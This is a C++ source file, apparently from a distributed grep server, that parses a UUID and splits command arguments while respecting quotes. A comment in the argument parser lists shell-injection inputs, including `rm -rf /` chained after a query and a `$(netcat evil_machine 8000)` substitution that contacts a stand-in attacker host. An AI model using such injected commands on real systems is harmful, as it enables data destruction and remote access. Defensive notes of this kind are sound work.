
#include <sstream>
#include <stdexcept>
#include "Command.hpp"
#include "server.hpp"
#include <algorithm>

grep::Command::Command(const std::string &commandStr)
{
  // Make sure the command string begins with a valid UUID
  this->uuid = "";
  this->argList = parseArgs(commandStr);
}

std::string grep::Command::parseUUID(const std::string &uuidStr) const
{
  if (uuidStr.length() < UUID_STR_LENGTH) {
    throw std::invalid_argument(uuidStr);
  }
  int chunkSizes[] = {8, 4, 4, 4, 12};
  bool firstPass = true;
  auto it = uuidStr.begin();
  for (unsigned j = 0; j < sizeof(chunkSizes) / sizeof(*chunkSizes); j++) {
    int chunkSize = chunkSizes[j];
    // Make sure we have a series of dashes followed by hex digits
    if (!firstPass) {
      if (*it++ != '-') {
        throw std::invalid_argument(uuidStr);
      }
    } else {
      firstPass = false;
    }
    int i = 0;
    while (i++ < chunkSize && it != uuidStr.end()) {
      char c = *it++;
      if (!(('0' <= c && c <= '9') ||
            ('A' <= c && c <= 'F') ||
            ('a' <= c && c <= 'f'))) {
        throw std::invalid_argument(uuidStr);
      }
    }
  }
  // All checks passed.
  return uuidStr.substr(0, UUID_STR_LENGTH);
}

std::vector<std::string>
grep::Command::parseArgs(const std::string &argStr) const
{
  // :
  //   -i "query"; rm -rf /
  //   'txt' && rm -rf /
  //   < $(netcat evil_machine 8000)
  std::vector<std::string> args;
  char nextExpectedDelimiter = ' ';
  auto it = argStr.begin();
  while (it != argStr.end()) {
    std::stringstream arg;
    // Consume spaces between args
    while (*it == ' ' && it != argStr.end()) {
      ++it;
    }
    // Consume chars
    char prevChar = '\0';
    while ((*it != ' ' || nextExpectedDelimiter != ' ') && it != argStr.end()) {
      char c = *it;
      arg << c;
      // Check for quoted strings
      if ((c == '\'' || c == '"') && prevChar != '\\') {
        if (nextExpectedDelimiter == ' ') {
          nextExpectedDelimiter = c;
        } else if (nextExpectedDelimiter == c) {
          nextExpectedDelimiter = ' ';
        }
      }
      // Set up the next loop iteration
      prevChar = c;
      it++;
    }
    args.push_back(arg.str());
  }
  return args;
}
